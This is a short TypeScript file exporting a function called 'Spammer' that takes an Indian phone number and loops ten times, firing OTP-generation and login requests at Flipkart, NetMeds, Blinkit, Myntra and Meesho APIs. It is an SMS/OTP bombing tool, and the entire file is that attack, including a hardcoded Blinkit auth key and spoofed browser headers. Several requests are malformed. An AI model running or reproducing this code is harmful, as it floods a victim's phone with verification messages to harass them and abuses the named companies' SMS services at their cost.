import axios from "axios"

export async function Spammer(target : number) {
    for (let i = 0; i < 10; i++) {
        //Request to Flipkart
        await axios.post("https://2.rome.api.flipkart.com/api/7/user/otp/generate", {
            loginId: `+91${target}`,
        }, {
            headers: {
                "X-User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0 FKUA/website/42/website/Desktop"
            }
        })
          //Request To NetMeds
            await axios.get("https://www.netmeds.com/mst/rest/v1/id/details/"+`${target}`)
          //Request to blinkit
            await axios.post("https://blinkit.com/v2/accounts/" , {
                headers:{
                  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
                  "Accept-Encoding": "gzip, deflate, br, zstd",
                  "auth_key": "c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477"
                } ,
                data : {"user_phone" : `${target}`}

            })
          //Request to Myntra 
           await axios.post("https://www.myntra.com/gateway/v1/auth/getotp",{
              headers : {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
                "Origin": "https://www.myntra.com",
                "Connection": "keep-alive"
              },
              data : {
             "phoneNumber": `${target}`,
              "signup": "ONECLICK"
              }
           })
           //Request to Meesho
           axios.post("https://www.meesho.com/api/v1/user/login/request-otp",{
             headers : {},
             data : {
                "phone_number": `${target}`
             }
           })
    }
}